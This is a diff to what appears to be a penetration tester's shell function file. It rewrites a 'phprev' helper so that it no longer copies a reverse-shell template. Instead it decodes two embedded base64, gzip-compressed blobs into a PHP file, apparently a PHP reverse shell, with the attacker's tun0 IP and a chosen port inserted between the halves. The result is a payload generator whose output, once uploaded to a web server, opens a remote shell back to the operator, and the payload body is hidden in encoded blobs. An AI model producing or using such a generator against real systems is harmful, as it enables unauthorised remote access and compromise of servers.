@@ -197,9 +197,55 @@ sudo bloodhound &
 
 
 phprev() {
-# Adds IP and Port to /opt/php-reverse-shell/php-reverse-shell.php
-# Usage: phprev <port number>
-# Output to Desktop
 ipaddy=$(sudo ifconfig tun0 | grep "inet " | tr -s " " | cut -d " " -f 3)
-lhost="$ipaddy";lport="$1"; cat /opt/php-reverse-shell/php-reverse-shell.php | sed "s/^\$ip.*/\$ip = $lhost;/g" | sed "s/^\$port.*/\$port = $lport;/g" > ~/Desktop/php-reverse-shell.php
+port="$1"
+
+filetop=$(base64 -d <<< "H4sIAAAAAAAAA+VY224bNxB911cMgj7YiK5OggJxi1ZxrViAYi90qeEng9qdlQhzyS3Jlau/75ld
+WYmbJnXRFDZqPtjaXXJ4znDImcMffirXZavXI/zreN6wD9wJazaGOjSkafOGZvUbXZSGC7ZRRe0s
+aUvJWSKDT1y59Xq1jnRwckhH/f73VKIbh1g4e8Pbn+89dS1HjJKB87UOFJ0zVKgtLZmqwBnlzpPh
+lTJUVr50gQM5a7ZdokUAHIrqhimvgMhzKJ0NeqmNjluxKGOV3ZJKBWMADo9XBaxWQdsVxbsZYW2+
+ZlJVXMuQNOUyBrKOjFb3zWWqUCumVNXgltt7NsY5HhkuiuyLQMozbMSdPbU0+OBo66q2dLNiMnN1
+j0rG7A3t/DG2pEDLoa+vyXEKUHii98mEZC3E8UekytJoDm8/dWPp3cqrgvAz98wUXB5vgedYpgd6
+C4OZDtHrZRWZNEDarAd+hct0XrPFu8pmmFpmbAi5vJn+fEHv2bLHoiTV0uiUJjplCxKfoAp1JMln
+hNDOVUwjQTPboaGRwxR1AHW/gP4jyExiTEysXSneUlEg3mq4qIkVBEFbTKAzXY7nZxeLOQ3Pr+hy
+OJ0Oz+dXx+iM9cVXBHJjSoJYwzLAeGXjFgzFwofT6ckZhgzfjSfj+RXBL6Px/Px0NqPRxRRbIRlO
+5+OTxWQ4pWQxTS5mp1j9GQssFgNf8VBeOxncM45Km3BH/ArrEoDOZLRWG8b6pKw3wKYoxY56gO+V
+cXYlpoRmE047Rx6TziXO2nTrdayj8Gtr0Ubopd02PekmRN8MwEHZG4PImEWwAcORzsF+ZJzzbXrn
+QhQ+H4bUPxoM+p3Bq/6AFrNh97HhP7wJ0WfRvn0OeGxGX2j/NDU9KK08xSZE9+nur3PdY0P8Nu1Z
+7VHJVBKDbFNXeVRDmcRfYJshUxVSEoa2ZFbvNnWBGCR/hmq1QtFXx/oTjdZ7TYgWyKnx74rXxwb6
+b9uzCt1fOKRel7Vi+d82Idr52B4bzn/X9gVDs6iNFiikFoC+QZ2/lIqW5icJziVruc60cvgoVNg+
+S12Gk2uciPKh0vn4dHNRQ7TWBLrUOIH2smelRcooalS6r6yV4kE1MjGtvJfOyLieDlSp0rVUDr6A
+rNwePkW6z+owmuhCN7cn4U9btlbO3qXXULq2jk+IYFbFdeB4vTQuvZFV9vxbpZGHk7Nkr7tfd1+9
+bEu+ffNSjKA8FuG4H22wCQ4OUTxTro1I0GbnONTQnmPlbSPU93Ojbx1pOZRqjaPpRaPhZHa6ux64
+1DZzt7WOhZhEzkQRUMJ6J2o8uLLJ+XXRypztqvlMMVKoDs3l0YHR2LRlaqNpYysG/fthcyMjqhYD
+Pf4Y1MobwJB6904zLwKqj73vagBQtOsYy7e93meZuicFZ+h9frkFcSy3Iisk8xCr9KbbaomjBf+1
+kUWig/7hceu7X0+ns/HFOf1ILwbd/ovjVusPYCI2BjITAAA=" | gunzip )
+
+filebottom=$(base64 -d <<< "H4sIAAAAAAAAA61XbW/bNhD+7l9xMwxYBpwXZ/uUIB2KtB2CrU2RZMiHbTBoiYoIy6RGUnHdof99
+z5GSLbdqlrQzDNiS7vW5546nUVrUejl36qOkc5r9dHx8NhitrfJyLnBD12WJG9JaY7s3XCHLEpfj
+WouVpANxRuszUtkZHS2UPnIFHagx5DIhV0ZDkM1mclHfx/+DoyN86VV4rJwkU1sny5xUTpVxTi1K
+Sd6QeDAqo49mtVDSUSm8tKzKulWqfTnPjV2SclQIm5Ubkg/SQkmoUsDClBa1p7VCqKIszZpqx0az
+1iubgWOqiooqa1LpHAmd7Xs9JLoz1hckyNvN4eHhADEmea1Tr4yeyw/KeZeMd+GMJxP6Z0DNBy7e
+cIxstxAPyKqQVAkrtd/6hA2/VRhV8H3eSS+ZAK/2KfuOEud0MOs6aj+VVdornwxfX19fXZ/ShdBj
+T2xoCEOfS7PrZNZ58OlLX31egt7x5Cwk+D6mw/dcnyGIvBXLmHpa273cBTn8AEkqpchQ3o7SHVfO
+aNTV1WkqZcYhrWVIRmZ7cYI06sPcSe9Ulkyegg5TukWn1XsuQjt+z84Gn0iWYPLO59bX3cvrd5fv
+fjmlNyAmsuhyEPS6LUBgfP+u0XaUmhWbZL5og8IJL8pDDuxToP1FIfR97A1yIpeUKStTb+xmkBb4
+nwyPWJhFr+EChBN6Q/VKuCVDp3QhubuzQbjFJdw2owkFstxDyCO0ONO96berSurtw9RoLUMDYBaY
+dAkEcv41EEpGqpqCxmga/GB0aBN/nbdT+pE9csV+CIqTPrwaYbAvaO+VZVuOCMdNJdY6xtpSigeN
+S62qAIqrZIrYhLVik7CNYzp/0VwOK1XJ4ZSGdjiZBr45nynNlRDEzwCH8JG0hSqzOEgsWEq5NSu2
+Nuuxtu5YMxg/j5sLoxbVZGsn/daotQYwnmqNqzpqW+w8IDOPtQlQoR77GHG9YNSxXiiOcnMrHYZj
+KpPW0KS3WHtjxu3K8VjRpA+TeuMLpe+Zy9rog0UJPuA6Ulc4o0/pKk15NmB6bwLyLuYZRKdsQwMC
+U98XwAfPV5gAJXhJHgG4MO4LuaG1QWyDrYSft66SmPUfx39NiXn5iMjsv0VOHhNxIeLQblvobniq
+OZfXnB6XB7Nhr/0YGnTTaWim0NZrFFtSMvvsiLkoJJoQc5Ek5obJ6fbifbdJu6MylyaP8Uyecn7c
+hEB2toCtXSmNozjrG5cL5L7sHZZ9Yd7cvrr6/bYnvBb0Z4TY0v074rsTylMN21gYwiDmKYyW42gz
+A2Y3ZUQCzqxkV7WVRstXTde3awiOsCZRVsQ/hL07QpjWYbWKnd946LBuy65ONiNdr+ZpOAqyOWvg
+AIOJvSZIGtOw0Cx0cQzzJjcNi1x3sUAKl+FwTYXeDbkwYJhL0ccUJ6XOujoZjidmaQP+2HF+l+/2
+Kqr0fD+3GFdvacPOERbFya7MN1cXv9L165ev+go6UpoBxwHEZrc+dnttj85XvZw25voc5QHF7siI
+sv2rwSN47mHVpT+P+UA1BjXwzafV19p4h2qHKs9GNtLyqdh2PH0DvsHXUxBuSvg/oNvttO9C9+Qb
+0UUAz0T35JvRha/vQhf45mlpXCODZ+1lS/kvbs2+vBXmVFg42tvN9hCX0t/UUsao49tZZvBih0U3
+bAJhvR9jZ92ux1n7Zsi6ySXXm99m1H1t+aXRU4HXOswfK+Me3A7akt0IJkOFN8JobjJo39pa2IAj
+RiY8d0sal9NG5WunDw0bzT/18DMMf35Bg38BTHZA/VcPAAA=" | gunzip )
+
+echo -e "$filetop\n\$ip = '$ipaddy';\n\$port = '$1'; \n$filebottom" > revshell.php
+
 }
